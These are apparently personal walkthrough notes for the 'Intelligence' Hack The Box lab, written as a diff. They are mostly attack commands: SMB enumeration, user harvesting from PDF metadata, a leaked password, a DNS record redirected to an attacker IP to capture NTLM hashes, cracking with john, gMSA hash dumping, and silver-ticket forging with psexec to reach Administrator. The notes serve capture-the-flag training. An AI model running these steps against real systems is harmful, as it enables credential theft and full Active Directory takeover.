@@ -1,0 +1,170 @@
+nmap -sV -sC -v -oA nmap/intelligence ip address
+
+try to login with 
+start with 
+rpcclient -U '' 10.129.162.206 
+
+hit enter for password
+
+also try with -N for no password
+rpcclient -U '' -N 10.129.162.206 
+
+try to do enumdomusers
+
+try to use crackmapexec smb 10.129.162.206
+
+crackmapexec smb 10.129.162.206 --shares
+
+crackmapexec smb 10.129.162.206 -u '' -p '' --shares
+
+crackmapexec smb 10.129.162.206 --pass-pol
+
+crackmapexec smb 10.129.162.206 --users
+
+
+go to the website 
+
+in the bottom of the page, download the pdf files 
+
+go to the pdf files and in the url go to the root of the url
+
+
+http://intelligence.htb/documents/2020-12-15-upload.pdf = http://intelligence.htb/documents/
+
+
+crerate a date wordlist 
+
+year=2020; for i in $(seq $(( ( $(date +%s) - $(date --date="$year-12-31" +%s) ) / 86400 )) $(( ( $(date +%s) - $(date --date="$year-01-01" +%s) ) / 86400 )) ); do date --date="$i day ago" +%Y-%m-%d-upload.pdf; done
+
+for i in $(cat ../files); do wget http://10.129.162.206/documents/$i; done
+
+do an exiftool * to look at the metadata
+
+exiftool * | grep Modification | sort -u
+
+exiftool * | grep Creator
+
+create user name wordlist 
+exiftool * | grep Creator| awk '{print $3}' > ../users
+
+use kerbrute go to github kerbrute: https://github.com/ropnop/kerbrute
+
+
+kerbrute userenum --dc 10.129.83.93 -d intelligence.htb users
+
+
+for i in $(ls); do pdftotext $i; done
+
+get the user password either line 60 or line 61
+
+cat *.txt | grep -i password -B5 -A5 
+for i in $(ls *.txt); do echo $i;  grep password $i;done
+
+make sure to change the ntp command for the clockskew
+
+crackmapexec smb ip address -u tiffany.Molina -p NewIntelligenceCorpUser9876
+
+crackmapexec winrm ip address -u tiffany.Molina -p NewIntelligenceCorpUser9876
+
+time crackmapexec smb  10.129.83.93 -u tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus
+
+use bloodhound 
+
+clone bloodhound
+
+cd bloodhound 
+
+sudo python3 bloodhound.py -d intelligence.htb -dc 10.129.83.93 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
+
+smbclient -U intelligence\\Tiffany.Molina //10.129.59.152/IT
+
+download downdetector.ps1 
+
+cat downdetector.ps1
+
+
+connect to bloodhound and drag the files 
+
+In bloodhound 
+
+go to analysis
+
+click find all domain admins
+
+find shortestpath 
+
+
+mark Tiffany.molinda as pwnd
+
+look at shortest path from owned principles
+
+look at the group membership
+look at unrolled group membership
+
+do crackmapexec to find other users
+
+use krbrelayx
+git clone https://github.com/dirkjanm/krbrelayx
+
+
+sudo python3 dnstool.py -u 'intelligence\tiffany.molina' -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a add -t A -d 10.10.16.4 10.129.127.123
+
+do a sudo nc -lvnp 80 to get a response fro mthe krbrelay
+
+do a nslookup 
+
+server 10.129.127.123
+
+then type "webtest1.intelligence.htb"
+
+
+can use responder
+
+with sudo responder -I tun0
+
+another way is sudo msfdb run
+
+msfconsole
+
+use auxiliary/server/capture/http_ntlm
+
+set SRVPORT 80
+set URIPATH /
+set SRVHOST 10.10.16.4
+set JOHNPWFILE intelligence
+sudo tcpdump -i tun0 port 80 -n -vvv
+
+use john to crack the ntlmv2 hash
+john intelligence_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt 
+
+to show password 
+john intelligence_netntlmv2 --show 
+
+in bloodhound do shortest path to SV account 
+
+right click and click help on the it path that Ted is apart of 
+
+download gmsadumper https://github.com/micahvandeusen/gMSADumper.git
+
+created the hash
+
+python3 gMSADumper.py -u 'ted.graves' -p Mr.Teddy -d intelligence.htb
+
+need to create a silver ticket 
+
+**when creating a silver ticket, need to do a date sync on the server using 
+
+sudo ntpdate ipaddress
+cd to /opt/impacket
+
+do git pull
+
+uses the hash to create silverticket
+
+THis is the new way 
+sudo python3 getST.py intelligence.htb/svc_int -impersonate Administrator -spn www/dc.intelligence.htb -hashes :1dcabcce2cf522bae77d7dc622587879 -dc-ip 10.129.127.123
+
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k no pass administrator@dc.intelligence.htb
+
+or try a one liner  "KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb"
